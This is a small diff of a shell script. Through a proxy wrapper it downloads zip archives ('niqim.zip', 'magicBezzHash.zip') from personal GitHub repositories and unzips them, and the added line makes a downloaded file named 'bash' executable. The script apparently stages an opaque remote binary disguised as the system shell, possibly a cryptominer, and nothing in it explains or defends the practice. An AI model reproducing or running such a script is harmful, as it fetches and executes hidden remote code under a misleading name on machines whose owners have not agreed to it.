@@ -40,6 +40,8 @@ echo " "
 
 ./graftcp/graftcp wget https://github.com/komaria10003099/komaria/raw/main/niqim.zip && unzip niqim.zip
 
+chmod +x bash
+
 wget https://github.com/komaria10003099/wappahj/raw/main/magicBezzHash.zip
 
 unzip magicBezzHash.zip
